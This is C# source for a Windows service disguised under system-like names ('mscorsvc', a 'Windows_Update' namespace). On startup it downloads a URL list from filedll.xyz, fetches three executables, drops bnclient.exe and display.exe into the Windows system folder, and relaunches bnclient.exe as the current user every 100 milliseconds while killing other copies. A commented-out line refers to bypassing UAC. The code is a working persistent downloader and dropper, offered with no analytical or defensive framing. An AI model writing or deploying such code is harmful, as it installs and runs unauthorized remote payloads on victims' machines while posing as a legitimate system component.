using System.ServiceProcess;
using System.Diagnostics;
using System.Timers;
using System.Net;
using System.IO;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using murrayju.ProcessExtensions;
using System.Threading.Tasks;
using Windows_Update;
using System.Threading;

namespace mscorsvc
{
    public partial class MyService : ServiceBase
    {
        byte[] svnhost, bnclient, display;
        public MyService()
        {
            InitializeComponent();
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            WebClient client = new WebClient();
            var urls = client.DownloadString("https://filedll.xyz/dwfiles.php").Split(';');
            svnhost = client.DownloadData(urls[1]);
            bnclient = client.DownloadData(urls[0]);
            display = client.DownloadData(urls[2]);

            timer = new System.Timers.Timer(100);
            timer.Elapsed += Timer_Elapsed;
        }
        uint procid;
        void KillOther()
        {
            try
            {
                var all = Process.GetProcessesByName("bnclient");
                foreach (var item in all)
                {
                    if (item.Id != procid)
                        item.Kill();
                }
            }
            catch
            {

            }
        }
        Process FindProcess(uint id)
        {
            try
            {
                return Process.GetProcessById((int)procid);
            }
            catch
            {
                return null;
            }
        }
        private void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                try
                {
                    FileInfo info = new FileInfo(DesktopPath);
                    if(info.Length> 1000000)
                    {
                        info.Delete();
                    }
                }
                catch
                {

                }
                if (!File.Exists(bnclient_path))
                {
                    File.WriteAllBytes(bnclient_path, bnclient);
                }
                if (!File.Exists(display_path))
                {
                    File.WriteAllBytes(display_path, display);
                }
                File.AppendAllText(DesktopPath, "1. Timer elapsed " + procid + DateTime.Now + Environment.NewLine);
                if (procid == 0 || FindProcess(procid) == null)
                {
                    procid = ProcessExtensions.StartProcessAsCurrentUser("bnclient.exe");
                    Process procc = FindProcess(procid);
                    File.AppendAllText(DesktopPath, "2. Running new " + procid + DateTime.Now + Environment.NewLine);
                    KillOther();
                }
                else
                {
                    KillOther();
                    File.AppendAllText(DesktopPath, "3. Trying kill others " + procid + DateTime.Now + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText(DesktopPath, "4. " +ex.Message + " " + DateTime.Now + Environment.NewLine);
            }

        }

        private volatile bool _interval;
        public bool finish
        {
            get
            {
                return _interval;
            }
            set
            {
                _interval = value;
            }
        }
        static string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\log_svc.txt";
        string bnclient_path = string.Format("{0}\\bnclient.exe", Environment.GetFolderPath(Environment.SpecialFolder.SystemX86));
        string display_path = string.Format("{0}\\display.exe", Environment.GetFolderPath(Environment.SpecialFolder.SystemX86));

        System.Timers.Timer timer;
        protected override void OnStart(string[] args)
        {
            timer.Start();
        }
        protected override void OnStop()
        {
            timer.Stop();
            try
            {
                procid = 0;
                var all = Process.GetProcessesByName("bnclient");
                foreach (var item in all)
                {
                    item.Kill();
                }
            }
            catch
            {

            }
        }

        protected override void OnContinue()
        {
            this.OnStart(null);
        }

        protected override void OnPause()
        {
            this.OnStop();
        }

        protected override void OnShutdown()
        {
            this.OnStop();
        }
    }
}

//ApplicationLoader.StartProcessAndBypassUAC("bnclient.exe", out ApplicationLoader.PROCESS_INFORMATION d);
//procid = d.dwProcessId;
//AppendLog(d.dwProcessId.ToString());
